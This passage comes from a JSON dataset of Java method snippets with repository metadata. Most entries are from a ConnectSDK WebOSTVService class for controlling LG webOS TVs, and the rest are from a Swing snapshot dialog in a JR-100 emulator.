              JSONObject jsonObj = (JSONObject)response;\n                    JSONArray services = (JSONArray) jsonObj.get(\"services\");\n                    Util.postSuccess(listener, services);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        });\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34781, "method_name": "getSystemInfo", "class_name": "WebOSTVService", "params": ["SystemInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getSystemInfo(final SystemInfoListener listener) {\n        String uri = \"ssap://system/getSystemInfo\";\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    JSONObject features = (JSONObject) jsonObj.get(\"features\");\n                    Util.postSuccess(listener, features);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        });\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34782, "method_name": "secureAccessTest", "class_name": "WebOSTVService", "params": ["SecureAccessTestListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void secureAccessTest(final SecureAccessTestListener listener) {\n        String uri = \"ssap://com.webos.service.secondscreen.gateway/test/secure\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n                try {\n                    JSONObject jsonObj = (JSONObject) response;\n                    boolean isSecure = (Boolean) jsonObj.get(\"returnValue\");\n                    Util.postSuccess(listener, isSecure);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34783, "method_name": "getACRAuthToken", "class_name": "WebOSTVService", "params": ["ACRAuthTokenListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getACRAuthToken(final ACRAuthTokenListener listener) {\n        String uri = \"ssap://tv/getACRAuthToken\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n                try {\n                    JSONObject jsonObj = (JSONObject) response;\n                    String authToken = (String) jsonObj.get(\"token\");\n                    Util.postSuccess(listener, authToken);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34784, "method_name": "getLaunchPoints", "class_name": "WebOSTVService", "params": ["LaunchPointsListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getLaunchPoints(final LaunchPointsListener listener) {\n        String uri = \"ssap://com.webos.applicationManager/listLaunchPoints\";\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n\n                try {\n                    JSONObject jsonObj = (JSONObject) response;\n                    JSONArray launchPoints = (JSONArray) jsonObj.get(\"launchPoints\");\n                    Util.postSuccess(listener, launchPoints);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34785, "method_name": "getPlaylistControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PlaylistControl", "snippet": "    public PlaylistControl getPlaylistControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34786, "method_name": "getPlaylistControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPlaylistControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34787, "method_name": "jumpToTrack", "class_name": "WebOSTVService", "params": ["long", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void jumpToTrack(long index, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34788, "method_name": "setPlayMode", "class_name": "WebOSTVService", "params": ["PlayMode", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPlayMode(PlayMode playMode, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34789, "method_name": "sendCommand", "class_name": "WebOSTVService", "params": ["ServiceCommand<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendCommand(ServiceCommand<?> command) {\n        if (socket != null)\n            socket.sendCommand(command);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34790, "method_name": "unsubscribe", "class_name": "WebOSTVService", "params": ["URLServiceSubscription<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unsubscribe(URLServiceSubscription<?> subscription) {\n        if (socket != null)\n            socket.unsubscribe(subscription);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34791, "method_name": "updateCapabilities", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateCapabilities() {\n        List<String> capabilities = new ArrayList<String>();\n\n        if (DiscoveryManager.getInstance().getPairingLevel() == PairingLevel.ON) {\n            Collections.addAll(capabilities, TextInputControl.Capabilities);\n            Collections.addAll(capabilities, MouseControl.Capabilities);\n            Collections.addAll(capabilities, KeyControl.Capabilities);\n            Collections.addAll(capabilities, MediaPlayer.Capabilities);\n            Collections.addAll(capabilities, Launcher.Capabilities);\n            Collections.addAll(capabilities, TVControl.Capabilities);\n            Collections.addAll(capabilities, ExternalInputControl.Capabilities);\n            Collections.addAll(capabilities, VolumeControl.Capabilities);\n            Collections.addAll(capabilities, ToastControl.Capabilities);\n\n            capabilities.add(PowerControl.Off);\n        } else {\n            Collections.addAll(capabilities, VolumeControl.Capabilities);\n            Collections.addAll(capabilities, MediaPlayer.Capabilities);\n\n            capabilities.add(Application);\n            capabilities.add(Application_Params);\n            capabilities.add(Application_Close);\n            capabilities.add(Browser);\n            capabilities.add(Browser_Params);\n            capabilities.add(Hulu);\n            capabilities.add(Netflix);\n            capabilities.add(Netflix_Params);\n            capabilities.add(YouTube);\n            capabilities.add(YouTube_Params);\n            capabilities.add(AppStore);\n            capabilities.add(AppStore_Params);\n            capabilities.add(AppState);\n            capabilities.add(AppState_Subscribe);\n        }\n\n        if (serviceDescription != null && serviceDescription.getVersion() != null) {\n            if (serviceDescription.getVersion().contains(\"4.0.0\") || serviceDescription.getVersion().contains(\"4.0.1\")) {\n                capabilities.add(Launch);\n                capabilities.add(Launch_Params);\n\n                capabilities.add(Play);\n                capabilities.add(Pause);\n                capabilities.add(Stop);\n                capabilities.add(Seek);\n                capabilities.add(Position);\n                capabilities.add(Duration);\n                capabilities.add(PlayState);\n\n                capabilities.add(WebAppLauncher.Close);\n            } else {\n                Collections.addAll(capabilities, WebAppLauncher.Capabilities);\n                Collections.addAll(capabilities, MediaControl.Capabilities);\n\n                capabilities.add(PlaylistControl.JumpToTrack);\n                capabilities.add(PlaylistControl.Next);\n                capabilities.add(PlaylistControl.Previous);\n\n                capabilities.add(MediaPlayer.Loop);\n            }\n        }\n\n        setCapabilities(capabilities);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34792, "method_name": "getPermissions", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getPermissions() {\n        if (permissions != null)\n            return permissions;\n\n        List<String> defaultPermissions = new ArrayList<String>();\n        Collections.addAll(defaultPermissions, kWebOSTVServiceOpenPermissions);\n\n        if (DiscoveryManager.getInstance().getPairingLevel() == PairingLevel.ON) {\n            Collections.addAll(defaultPermissions, kWebOSTVServiceProtectedPermissions);\n            Collections.addAll(defaultPermissions, kWebOSTVServicePersonalActivityPermissions);\n        }\n\n        permissions = defaultPermissions;\n\n        return permissions;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34793, "method_name": "setPermissions", "class_name": "WebOSTVService", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPermissions(List<String> permissions) {\n        this.permissions = permissions;\n\n        WebOSTVServiceConfig config = (WebOSTVServiceConfig) serviceConfig;\n\n        if (config.getClientKey() != null) {\n            config.setClientKey(null);\n\n            if (isConnected()) {\n                Log.w(Util.T, \"Permissions changed -- you will need to re-pair to the TV.\");\n                disconnect();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34794, "method_name": "parseRawProgramInfo", "class_name": "WebOSTVService", "params": ["JSONObject"], "throws": null, "modifiers": ["private"], "return_type": "ProgramInfo", "snippet": "    private ProgramInfo parseRawProgramInfo(JSONObject programRawData) {\n        String programId;\n        String programName;\n\n        ProgramInfo programInfo = new ProgramInfo();\n        programInfo.setRawData(programRawData);\n        \n        programId = programRawData.optString(\"programId\");\n        programName = programRawData.optString(\"programName\");\n        ChannelInfo channelInfo = parseRawChannelData(programRawData);\n\n        programInfo.setId(programId);\n        programInfo.setName(programName);\n        programInfo.setChannelInfo(channelInfo);\n\n        return programInfo;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34795, "method_name": "parseRawChannelData", "class_name": "WebOSTVService", "params": ["JSONObject"], "throws": null, "modifiers": ["private"], "return_type": "ChannelInfo", "snippet": "    private ChannelInfo parseRawChannelData(JSONObject channelRawData) {\n        String channelName = null;\n        String channelId = null;\n        String channelNumber = null;\n        int minorNumber;\n        int majorNumber;\n\n        ChannelInfo channelInfo = new ChannelInfo();\n        channelInfo.setRawData(channelRawData);\n\n        try {\n            if (!channelRawData.isNull(\"channelName\")) \n                channelName = (String) channelRawData.get(\"channelName\");\n\n            if (!channelRawData.isNull(\"channelId\")) \n                channelId = (String) channelRawData.get(\"channelId\");\n\n            channelNumber = channelRawData.optString(\"channelNumber\");\n\n            if (!channelRawData.isNull(\"majorNumber\"))\n                majorNumber = (Integer) channelRawData.get(\"majorNumber\");\n            else \n                majorNumber = parseMajorNumber(channelNumber);\n\n            if (!channelRawData.isNull(\"minorNumber\"))\n                minorNumber = (Integer) channelRawData.get(\"minorNumber\");\n            else\n                minorNumber = parseMinorNumber(channelNumber);\n\n            channelInfo.setName(channelName);\n            channelInfo.setId(channelId);\n            channelInfo.setNumber(channelNumber);\n            channelInfo.setMajorNumber(majorNumber);\n            channelInfo.setMinorNumber(minorNumber);\n\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        return channelInfo;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34796, "method_name": "parseMinorNumber", "class_name": "WebOSTVService", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int parseMinorNumber(String channelNumber) {\n        if (channelNumber != null) {\n            String tokens[] = channelNumber.split(\"-\");\n            return Integer.parseInt(tokens[tokens.length-1]);\n        }\n        else \n            return 0;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34797, "method_name": "parseMajorNumber", "class_name": "WebOSTVService", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int parseMajorNumber(String channelNumber) {\n        if (channelNumber != null) {\n            String tokens[] = channelNumber.split(\"-\");\n            return Integer.parseInt(tokens[0]);\n        }\n        else \n            return 0;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34798, "method_name": "externalnputInfoFromJSONArray", "class_name": "WebOSTVService", "params": ["JSONArray"], "throws": null, "modifiers": ["private"], "return_type": "List<ExternalInputInfo>", "snippet": "    private List<ExternalInputInfo> externalnputInfoFromJSONArray(JSONArray inputList) {\n        List<ExternalInputInfo> externalInputInfoList = new ArrayList<ExternalInputInfo>();\n\n        for (int i = 0; i < inputList.length(); i++) {\n            try {\n                JSONObject input = (JSONObject) inputList.get(i);\n\n                String id = input.getString(\"id\");\n                String name = input.getString(\"label\");\n                boolean connected = input.getBoolean(\"connected\");\n                String iconURL = input.getString(\"icon\");\n\n                ExternalInputInfo inputInfo = new ExternalInputInfo();\n                inputInfo.setRawData(input);\n                inputInfo.setId(id);\n                inputInfo.setName(name);\n                inputInfo.setConnected(connected);\n                inputInfo.setIconURL(iconURL);\n\n                externalInputInfoList.add(inputInfo);\n            } catch (JSONException e) {\n                e.printStackTrace();\n            }\n        }\n\n        return externalInputInfoList;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34799, "method_name": "getPlayState", "class_name": "WebOSTVService", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPlayState(PlayStateListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34800, "method_name": "subscribePlayState", "class_name": "WebOSTVService", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<PlayStateListener>", "snippet": "    public ServiceSubscription<PlayStateListener> subscribePlayState(PlayStateListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34801, "method_name": "isConnectable", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isConnectable() {\n        return true;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34802, "method_name": "sendPairingKey", "class_name": "WebOSTVService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendPairingKey(String pairingKey) {\n        if (this.socket != null) {\n            this.socket.sendPairingKey(pairingKey);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34803, "method_name": "initialize", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initialize() {\n        this.setSize(437, 150);\n        this.setTitle(\"\u30b9\u30ca\u30c3\u30d7\u30b7\u30e7\u30c3\u30c8\u306e\u63a1\u53d6\");\n        this.setContentPane(getJContentPane());\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34804, "method_name": "getJContentPane", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JPanel", "snippet": "    private JPanel getJContentPane() {\n        if (jContentPane == null) {\n            jContentPane = new JPanel();\n            jContentPane.setLayout(new BoxLayout(getJContentPane(), BoxLayout.Y_AXIS));\n            jContentPane.add(getP_main(), null);\n            jContentPane.add(getP_buttons(), null);\n        }\n        return jContentPane;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34805, "method_name": "getP_main", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JPanel", "snippet": "    private JPanel getP_main() {\n        if (P_main == null) {\n            GridBagConstraints gridBagConstraints21 = new GridBagConstraints();\n            gridBagConstraints21.fill = GridBagConstraints.BOTH;\n            gridBagConstraints21.weighty = 1.0;\n            gridBagConstraints21.gridx = 1;\n            gridBagConstraints21.gridy = 2;\n            gridBagConstraints21.weightx = 1.0;\n            GridBagConstraints gridBagConstraints2 = new GridBagConstraints();\n            gridBagConstraints2.gridx = 0;\n            gridBagConstraints2.anchor = GridBagConstraints.NORTHWEST;\n            gridBagConstraints2.gridy = 2;\n            L_comment = new JLabel();\n            L_comment.setText(\"\u30b3\u30e1\u30f3\u30c8\");\n            GridBagConstraints gridBagConstraints1 = new GridBagConstraints();\n            gridBagConstraints1.fill = GridBagConstraints.NONE;\n            gridBagConstraints1.gridy = 1;\n            gridBagConstraints1.weightx = 1.0;\n            gridBagConstraints1.anchor = GridBagConstraints.WEST;\n            gridBagConstraints1.gridx = 1;\n            GridBagConstraints gridBagConstraints = new GridBagConstraints();\n            gridBagConstraints.gridx = 0;\n            gridBagConstraints.gridy = 1;\n            L_name = new JLabel();\n            L_name.setText(\"\u30b9\u30ca\u30c3\u30d7\u30b7\u30e7\u30c3\u30c8\u540d\");\n            P_main = new JPanel();\n            P_main.setLayout(new GridBagLayout());\n            P_main.add(L_name, gridBagConstraints);\n            P_main.add(getTF_name(), gridBagConstraints1);\n            P_main.add(L_comment, gridBagConstraints2);\n            P_main.add(getSP_comment(), gridBagConstraints21);\n        }\n        return P_main;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34806, "method_name": "getP_buttons", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JPanel", "snippet": "    private JPanel getP_buttons() {\n        if (P_buttons == null) {\n            P_buttons = new JPanel();\n            P_buttons.setLayout(new BoxLayout(getP_buttons(), BoxLayout.X_AXIS));\n            P_buttons.add(Box.createHorizontalGlue());\n            P_buttons.add(getBT_OK(), null);\n            P_buttons.add(getBT_cancel(), null);\n        }\n        return P_buttons;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34807, "method_name": "getBT_OK", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JButton", "snippet": "    private JButton getBT_OK() {\n        if (BT_OK == null) {\n            BT_OK = new JButton();\n            BT_OK.setText(\"\u63a1\u53d6\");\n            BT_OK.addActionListener(new java.awt.event.ActionListener() {\n                public void actionPerformed(java.awt.event.ActionEvent e) {\n                    if (TF_name.getText().equals(\"\")) {\n                        JOptionPane.showMessageDialog(\n                            null,\n                            \"\u30b9\u30ca\u30c3\u30d7\u30b7\u30e7\u30c3\u30c8\u540d\u304c\u7a7a\u3067\u3059\u3002\",\n                            \"ERROR\",\n                            JOptionPane.ERROR_MESSAGE);\n                        return ;\n                    }\n                    try {\n                        computer.pause();\n                        computer.getApplication().saveState(TF_name.getText(), TA_comment.getText());\n                    }\n                    catch (FileNotFoundException ex) {\n                        JOptionPane.showMessageDialog(\n                            null,\n                            ex.getMessage(),\n                            \"ERROR\",\n                            JOptionPane.ERROR_MESSAGE);\n                            return ;\n                    }\n                    catch (IOException ex) {\n                        JOptionPane.showMessageDialog(\n                            null,\n                            ex.getMessage(),\n                            \"ERROR\",\n                            JOptionPane.ERROR_MESSAGE);\n                        return ;\n                    }\n                    computer.resume();\n                    TakeSnapshotDialog.this.dispose();\n                }\n            });\n        }\n        return BT_OK;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34808, "method_name": "getBT_cancel", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JButton", "snippet": "    private JButton getBT_cancel() {\n        if (BT_cancel == null) {\n            BT_cancel = new JButton();\n            BT_cancel.setText(\"\u30ad\u30e3\u30f3\u30bb\u30eb\");\n            BT_cancel.addActionListener(new java.awt.event.ActionListener() {\n                public void actionPerformed(java.awt.event.ActionEvent e) {\n                    TakeSnapshotDialog.this.dispose();\n                }\n            });\n        }\n        return BT_cancel;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34809, "method_name": "getTF_name", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JTextField", "snippet": "    private JTextField getTF_name() {\n        if (TF_name == null) {\n            TF_name = new JTextField();\n            TF_name.setColumns(13);\n        }\n        return TF_name;\n    }", "url": 